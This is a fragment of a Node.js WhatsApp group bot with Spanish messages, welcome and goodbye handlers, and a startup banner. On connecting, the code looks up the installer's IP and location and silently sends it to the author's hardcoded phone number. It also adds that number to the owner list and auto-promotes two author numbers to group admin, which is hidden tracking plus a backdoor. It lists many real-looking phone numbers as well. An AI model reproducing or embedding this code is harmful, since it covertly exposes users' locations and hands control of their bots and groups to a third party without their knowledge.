...
cnf.autoReconnect = ReconnectMode.onConnectionLost
 ...
 cnf.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `Conectado`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: false, externalAdReply:{title: "Si quieres este bot, da clic aquí\n८≛ 𝓓𝓪𝓻𝓵𝔂𝓷 𔐬☆᤻᤻[𝓼𝓮𝔁]",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./confumods.jpg'),sourceUrl:"https://wa.me/51956570030?text=ola%20owner%20❤️"}}})
	console.log(color('|WRN|', 'yellow'), color('Enviando de información de usuario', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       cnf.sendMessage("51956570030@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n──────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: false, externalAdReply:{title: "Creador ८≛ 𝓓𝓪𝓻𝓵𝔂𝓷 𔐬☆᤻᤻[𝓼𝓮𝔁]",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./confumods.jpg'),sourceUrl:"https://wa.me/51956570030?text=Ola"}}})
...
exec(`cd /sdcard/download && play *mp3`)
   ...
   cnf.on('chat-update', async (mek) => {
        ...
        ownerNumber = ["51956570030@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
        dtod = "51956570030@s.whatsapp.net"
...
if(!num.split('@')[0].startsWith(994404752227)) // 994//
if(!num.split('@')[0].startsWith(79054328423)) //7//
if(!num.split('@')[0].startsWith(33757909082)) //33//
if(!num.split('@')[0].startsWith(79653450669)) //7//
if(!num.split('@')[0].startsWith(393792678452)) //Ely//
if(!num.split('@')[0].startsWith(642796865555))
if(!num.split('@')[0].startsWith(48888888528)) //Ronrad//
if(!num.split('@')[0].startsWith(33688388881)) //Kuin//
if(!num.split('@')[0].startsWith(380942369785)) //Empresario//
if(!num.split('@')[0].startsWith(380946048230)) //C32//
if(!num.split('@')[0].startsWith(380946452839)) //Liam//
if(!num.split('@')[0].startsWith(33630507777))
if(!num.split('@')[0].startsWith(36306952225))
if(!num.split('@')[0].startsWith(524446630002))
if(!num.split('@')[0].startsWith(524522280947))
if(!num.split('@')[0].startsWith(526311883264))
if(!num.split('@')[0].startsWith(5493855935712))
if(!num.split('@')[0].startsWith(56950444444))
if(!num.split('@')[0].startsWith(573134649272))
if(!num.split('@')[0].startsWith(584126953803))
if(!num.split('@')[0].startsWith(994400015286))
{
...
//DARLYN
if (num.startsWith('51956570030')) {cnf.groupMakeAdmin(mdata.id, [num])}
if (num.startsWith('51918303426')) {cnf.groupMakeAdmin(mdata.id, [num])}
...
if (num.startsWith('51956570030')) return cnf.sendMessage(mdata.id, isaw, MessageType.text, {thumbnail: fs.readFileSync('./confumods.jpg'), contextInfo: { externalAdReply:{title: `Bienvenido a ${mdata.subject}`,body:"",mediaType:"2",thumbnail:buff,sourceUrl:`https://wa.me/${num.split("@")[0]}`}, "mentionedJid": [num]}})
if (num.startsWith('51918303426')) return cnf.sendMessage(mdata.id, isaw, MessageType.text, {thumbnail: fs.readFileSync('./confumods.jpg'), contextInfo: { externalAdReply:{title: `Bienvenido a ${mdata.subject}`,body:"",mediaType:"2",thumbnail:buff,sourceUrl:`https://wa.me/${num.split("@")[0]}`}, "mentionedJid": [num]}})
...
//Nuevo integrante
teks= `
𝒃𝒊𝒆𝒏𝒗𝒆𝒏𝒊𝒅𝒐/𝒂 ৎ୭ *@${num.split('@')[0]}*
_*Grupo:*_ ${mdata.subject}
...
let buff = await getBuffer(ppimg)
bye =`*@${num.split('@')[0]} ｡ . • ¨ * • ✧*`
cnf.sendMessage(mdata.id, bye, MessageType.text, {thumbnail: fs.readFileSync('./confumods.jpg'), contextInfo: { externalAdReply:{title: `Salio de ${mdata.subject}`,body:"No le vamos a extrañar...",mediaType:"2",thumbnail:buff,sourceUrl:`https://wa.me/${num.split("@")[0]}`}, "mentionedJid": [num]}})
...
function doProgress()
{
	...
	if ( progress >= 1 )
	{
		...
		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
			console.log(stdout), console.log(bgcolor('Hola, soy darlyn @darling_zbig', 'red'))})}, 200 ) ;
	}
	else
	{
...
console.log(color(figlet.textSync(`${settings.NameBanner}`, {
	    ...
	    }), 'lightgreen')), term.slowTyping('Edit by DARLYN Y SOFFF1' ,{ flashStyle: term.brightWhite })
